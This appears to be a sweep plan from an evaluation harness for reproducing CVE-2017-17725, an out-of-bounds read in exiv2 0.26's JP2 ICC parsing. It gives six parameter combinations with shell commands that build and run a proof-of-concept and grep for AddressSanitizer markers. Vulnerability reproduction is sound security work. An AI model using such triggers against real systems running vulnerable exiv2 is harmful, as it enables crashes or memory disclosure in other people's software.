# Exiv2 Sweep Plan: exiv2-0.26-cve-2017-17725

- Root: `/home/li/skillclaw-eval/exiv2-0.26`
- Total combinations: `6`
- Primary markers to watch:
  - `EXIV2_JP2_ICC_PATH_OK`
  - `EXIV2_ASAN_OOB_OK`
  - `TARGET_EXECUTION_RC=`
  - `AddressSanitizer`
  - `Jp2Image::readMetadata`
  - `getULong`

## Sweep Matrix

| idx | icc_size | colr_method | width | height |
| --- | --- | --- | --- | --- |
| 1 | 4 | 2 | 1 | 1 |
| 2 | 5 | 2 | 1 | 1 |
| 3 | 6 | 2 | 1 | 1 |
| 4 | 7 | 2 | 1 | 1 |
| 5 | 8 | 2 | 1 | 1 |
| 6 | 12 | 2 | 1 | 1 |

## Suggested Commands

### Combo 1

```bash
cd /home/li/skillclaw-eval/exiv2-0.26
EXIV2_ICC_SIZE=4 EXIV2_COLR_METHOD=2 EXIV2_JP2_WIDTH=1 EXIV2_JP2_HEIGHT=1 bash ../experiment_cases/pocs/exiv2-0.26-cve-2017-17725/prepare_artifacts.sh
bash artifacts/run_exiv2_poc.sh > artifacts/exiv2-sweep.stdout 2> artifacts/exiv2-sweep.stderr
grep -E "EXIV2_JP2_ICC_PATH_OK|EXIV2_ASAN_OOB_OK|TARGET_EXECUTION_RC=|AddressSanitizer|Jp2Image::readMetadata|getULong" artifacts/exiv2-sweep.stderr || true
```

### Combo 2

```bash
cd /home/li/skillclaw-eval/exiv2-0.26
EXIV2_ICC_SIZE=5 EXIV2_COLR_METHOD=2 EXIV2_JP2_WIDTH=1 EXIV2_JP2_HEIGHT=1 bash ../experiment_cases/pocs/exiv2-0.26-cve-2017-17725/prepare_artifacts.sh
bash artifacts/run_exiv2_poc.sh > artifacts/exiv2-sweep.stdout 2> artifacts/exiv2-sweep.stderr
grep -E "EXIV2_JP2_ICC_PATH_OK|EXIV2_ASAN_OOB_OK|TARGET_EXECUTION_RC=|AddressSanitizer|Jp2Image::readMetadata|getULong" artifacts/exiv2-sweep.stderr || true
```

### Combo 3

```bash
cd /home/li/skillclaw-eval/exiv2-0.26
EXIV2_ICC_SIZE=6 EXIV2_COLR_METHOD=2 EXIV2_JP2_WIDTH=1 EXIV2_JP2_HEIGHT=1 bash ../experiment_cases/pocs/exiv2-0.26-cve-2017-17725/prepare_artifacts.sh
bash artifacts/run_exiv2_poc.sh > artifacts/exiv2-sweep.stdout 2> artifacts/exiv2-sweep.stderr
grep -E "EXIV2_JP2_ICC_PATH_OK|EXIV2_ASAN_OOB_OK|TARGET_EXECUTION_RC=|AddressSanitizer|Jp2Image::readMetadata|getULong" artifacts/exiv2-sweep.stderr || true
```

### Combo 4

```bash
cd /home/li/skillclaw-eval/exiv2-0.26
EXIV2_ICC_SIZE=7 EXIV2_COLR_METHOD=2 EXIV2_JP2_WIDTH=1 EXIV2_JP2_HEIGHT=1 bash ../experiment_cases/pocs/exiv2-0.26-cve-2017-17725/prepare_artifacts.sh
bash artifacts/run_exiv2_poc.sh > artifacts/exiv2-sweep.stdout 2> artifacts/exiv2-sweep.stderr
grep -E "EXIV2_JP2_ICC_PATH_OK|EXIV2_ASAN_OOB_OK|TARGET_EXECUTION_RC=|AddressSanitizer|Jp2Image::readMetadata|getULong" artifacts/exiv2-sweep.stderr || true
```

### Combo 5

```bash
cd /home/li/skillclaw-eval/exiv2-0.26
EXIV2_ICC_SIZE=8 EXIV2_COLR_METHOD=2 EXIV2_JP2_WIDTH=1 EXIV2_JP2_HEIGHT=1 bash ../experiment_cases/pocs/exiv2-0.26-cve-2017-17725/prepare_artifacts.sh
bash artifacts/run_exiv2_poc.sh > artifacts/exiv2-sweep.stdout 2> artifacts/exiv2-sweep.stderr
grep -E "EXIV2_JP2_ICC_PATH_OK|EXIV2_ASAN_OOB_OK|TARGET_EXECUTION_RC=|AddressSanitizer|Jp2Image::readMetadata|getULong" artifacts/exiv2-sweep.stderr || true
```

### Combo 6

```bash
cd /home/li/skillclaw-eval/exiv2-0.26
EXIV2_ICC_SIZE=12 EXIV2_COLR_METHOD=2 EXIV2_JP2_WIDTH=1 EXIV2_JP2_HEIGHT=1 bash ../experiment_cases/pocs/exiv2-0.26-cve-2017-17725/prepare_artifacts.sh
bash artifacts/run_exiv2_poc.sh > artifacts/exiv2-sweep.stdout 2> artifacts/exiv2-sweep.stderr
grep -E "EXIV2_JP2_ICC_PATH_OK|EXIV2_ASAN_OOB_OK|TARGET_EXECUTION_RC=|AddressSanitizer|Jp2Image::readMetadata|getULong" artifacts/exiv2-sweep.stderr || true
```

